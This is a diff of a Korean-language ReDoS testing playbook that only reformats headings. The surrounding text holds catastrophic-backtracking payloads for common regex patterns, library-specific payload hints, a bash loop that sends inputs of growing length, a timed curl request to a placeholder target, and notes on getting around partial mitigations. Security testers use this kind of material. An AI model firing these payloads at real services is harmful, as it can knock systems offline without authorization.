@@ -1,6 +1,6 @@
 ### 기본 페이로드
 
-**기준선 측정 (필수):**
+#### 기준선 측정 (필수)
 ```bash
 # 정상 입력 3회 평균
 for i in 1 2 3; do
@@ -9,7 +9,7 @@ for i in 1 2 3; do
 done
 ```
 
-**점진적 길이 증가 페이로드 (catastrophic backtracking):**
+#### 점진적 길이 증가 페이로드 (catastrophic backtracking)
 
 phase1에서 식별한 취약 정규식의 반복 그룹에 매치하는 문자 + 마지막에 불일치 문자.
 
@@ -24,7 +24,7 @@ for n in 10 15 20 25 30 35; do
 done
 ```
 
-**정규식 패턴별 catastrophic 입력:**
+#### 정규식 패턴별 catastrophic 입력
 
 | 취약 패턴 | catastrophic 입력 |
 |---|---|
@@ -39,7 +39,7 @@ done
 | URL | `http://aaaaaaaaaaaaaaaaaa@!` |
 | `(.*?)+` (lazy) | `aaaaaaaaaaaaaaaaaaaa!` |
 
-**Library/version-specific 페이로드:**
+#### Library/version-specific 페이로드
 
 | 라이브러리 | 페이로드 |
 |---|---|
@@ -50,7 +50,7 @@ done
 | `moment.js` 파싱 | 특정 ISO 8601 변형 |
 | `semver` 구버전 | 매우 긴 version 문자열 |
 
-**Time-based 측정 (curl `-m 30`):**
+#### Time-based 측정 (curl `-m 30`)
 ```bash
 # 타임아웃 30초 — 취약 시 30초까지 매달림
 curl -m 30 -w "%{time_total}\n" -o /dev/null -s "https://target/api/x?input=$(python3 -c 'print("a"*30+"!")')"
@@ -69,7 +69,7 @@ curl -m 30 -w "%{time_total}\n" -o /dev/null -s "https://target/api/x?input=$(py
 | Possessive quantifier 일부만 적용 | 다른 부분 취약 잔존 |
 | RE2 + 일부 NFA 혼용 | RE2 이식 안 된 정규식 식별 후 공격 |
 
-**다양한 입력 길이 + 입력 컨텍스트:**
+#### 다양한 입력 길이 + 입력 컨텍스트
 ```
 # JSON body
 {"email":"aaaa...!"}
